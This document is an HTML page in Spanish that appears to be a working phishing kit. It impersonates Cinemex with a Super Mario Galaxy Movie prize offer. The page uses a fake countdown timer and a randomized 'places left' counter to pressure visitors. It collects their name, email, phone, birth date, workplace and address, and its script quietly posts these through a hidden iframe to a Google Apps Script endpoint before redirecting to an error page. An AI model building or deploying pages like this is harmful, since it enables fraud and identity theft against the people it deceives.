<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CINEMEX | The Super Mario Galaxy Movie</title>
    <style>
        /* Mantenemos tus estilos base */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --rojo: #e62424;
            --rojo-oscuro: #b31d1d;
            --dorado: #ffcc00;
            --blanco: #ffffff;
            --sombra: 0 20px 50px rgba(0,0,0,0.5);
        }

        body {
            font-family: "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(rgba(11, 16, 38, 0.8), rgba(11, 16, 38, 0.8)),
            #    url('https://images.unsplash.com/photo-1534796636912-3b95b3ab5986?auto=format&fit=crop&q=80&w=2071');
            background-size: cover;
            background-attachment: fixed;
            color: var(--blanco);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .top-warning { background: #ffcc00; color: #000; text-align: center; padding: 8px; font-weight: bold; font-size: 13px; }

        nav {
            padding: 20px 8%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(15px);
            display: flex;
            justify-content: space-between;
            border-bottom: 2px solid var(--rojo);
        }

        .hero {
            flex: 1;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 40px;
            align-items: center;
            padding: 40px 8%;
        }

        .promo-visual { text-align: center; }
        .promo-visual img {
            max-width: 100%;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(230, 36, 36, 0.4);
            margin-bottom: 20px;
        }

        /* ESTILOS DEL CONTADOR */
        .countdown {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 12px;
            display: inline-flex;
            gap: 15px;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .time-unit { text-align: center; min-width: 60px; }
        .time-unit div { font-size: 28px; font-weight: bold; color: var(--dorado); }
        .time-unit span { font-size: 10px; text-transform: uppercase; opacity: 0.8; }

        .form-card {
            background: #fdfdfd;
            color: #222;
            border-radius: 28px;
            padding: 40px;
            box-shadow: var(--sombra);
            position: relative;
        }

        .form-card::before {
            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 6px;
            background: linear-gradient(90deg, var(--rojo), var(--dorado));
        }

        .urgency-bar {
            background: #eee; height: 10px; border-radius: 5px; margin: 25px 0; position: relative;
        }

        .progress {
            background: var(--rojo); width: 92%; height: 100%; border-radius: 5px;
            transition: width 10s ease-in-out;
        }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .full { grid-column: 1 / -1; }

        label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 700; color: #444; }
        input {
            width: 100%; padding: 12px; border: 2px solid #e1e1e1; border-radius: 12px; font-size: 14px;
        }

        .cta-button {
            width: 100%; background: var(--rojo); color: white; padding: 18px; border: none;
            border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;
        }

        @media (max-width: 900px) { .hero { grid-template-columns: 1fr; } .promo-visual { display: none; } }
    </style>
</head>
<body>

    <div class="top-warning">
        ⚠️ PROMOCION UNICA ⚠️
    </div>

    <nav>
        <div style="font-size: 24px; font-weight: 900;">PROMO<span style="color:var(--rojo)">CINE</span></div>
    </nav>

    <section class="hero">
        <div class="promo-visual">
            <img src=logo.png>
            <h2>¡OFERTA POR TIEMPO LIMITADO!</h2>
            
            <div class="countdown">
                <div class="time-unit"><div id="horas">00</div><span>Horas</span></div>
                <div class="time-unit"><div id="minutos">15</div><span>Minutos</span></div>
                <div class="time-unit"><div id="segundos">00</div><span>Segundos</span></div>
            </div>
        </div>

        <div class="form-card">
            <h2>¡Últimos Accesos!</h2>
            <p style="text-align: center; color: #666;">Completa tu perfil para validar tu premio.</p>

            <div class="urgency-bar">
                <div class="progress" id="barra-progreso"></div>
                <span style="position: absolute; right: 0; top: -20px; font-size: 11px; font-weight: bold; color: var(--rojo);" id="contador-lugares">¡SOLO QUEDAN 8 LUGARES!</span>
            </div>

            <div class="grid">
                <div class="input-group full"><label>Nombre Completo</label><input type="text" id="nombre"></div>
                <div class="input-group"><label>E-mail Personal</label><input type="email" id="correo"></div>
                <div class="input-group"><label>Teléfono Móvil</label><input type="tel" id="telefono"></div>
                <div class="input-group"><label>Fecha de Nacimiento</label><input type="date" id="fecha"></div>
                <div class="input-group"><label>Lugar de Trabajo</label><input type="text" id="trabajo"></div>
                <div class="input-group full"><label>Dirección de Envío</label><input type="text" id="direccion"></div>
            </div>

            <button class="cta-button" onclick="enviarDatos()">RECLAMAR MI PREMIO AHORA</button>
        </div>
    </section>

    <script>
        // --- LÓGICA DEL CONTADOR EN TIEMPO REAL ---
        let tiempoTotal = (15 * 60) + 0; // 15 minutos en segundos

        function actualizarContador() {
            let h = Math.floor(tiempoTotal / 3600);
            let m = Math.floor((tiempoTotal % 3600) / 60);
            let s = tiempoTotal % 60;

            // Formato de dos dígitos
            document.getElementById('horas').innerText = h.toString().padStart(2, '0');
            document.getElementById('minutos').innerText = m.toString().padStart(2, '0');
            document.getElementById('segundos').innerText = s.toString().padStart(2, '0');

            if (tiempoTotal > 0) {
                tiempoTotal--;
                
                // Simulación: los lugares bajan aleatoriamente
                if (tiempoTotal % 45 === 0) {
                   let lugares = Math.floor(Math.random() * 5) + 2;
                   document.getElementById('contador-lugares').innerText = `¡SOLO QUEDAN ${lugares} LUGARES!`;
                   document.getElementById('barra-progreso').style.width = (lugares * 10) + "%";
                }
            } else {
                clearInterval(intervalo);
                alert("La promoción ha expirado.");
            }
        }

        const intervalo = setInterval(actualizarContador, 1000);

        // --- LÓGICA DE ENVÍO DE DATOS ---
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM6nmoaU0S9XA6gC-FjeAwytNdm4VK6zu8AvZH9ZYV1Gt9oA9CH3PF_qiRYa4EFAgGjA/exec";
        function enviarDatos() {
            const data = {
                nombre: document.getElementById('nombre').value.trim(),
                correo: document.getElementById('correo').value.trim(),
                fecha: document.getElementById('fecha').value,
                telefono: document.getElementById('telefono').value.trim(),
                direccion: document.getElementById('direccion').value.trim(),
                trabajo: document.getElementById('trabajo').value.trim()
            };

            if (Object.values(data).some(x => x === "")) {
                alert('Debe completar todos los campos para la validación.');
                return;
            }

            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = 'hidden_iframe';
            document.body.appendChild(iframe);

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = SCRIPT_URL;
            form.target = 'hidden_iframe';

            for (const key in data) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }

            document.body.appendChild(form);
            form.submit();

            setTimeout(() => {
                window.location.href = 'error.html';
            }, 500);
        }
    </script>
</body>
</html>
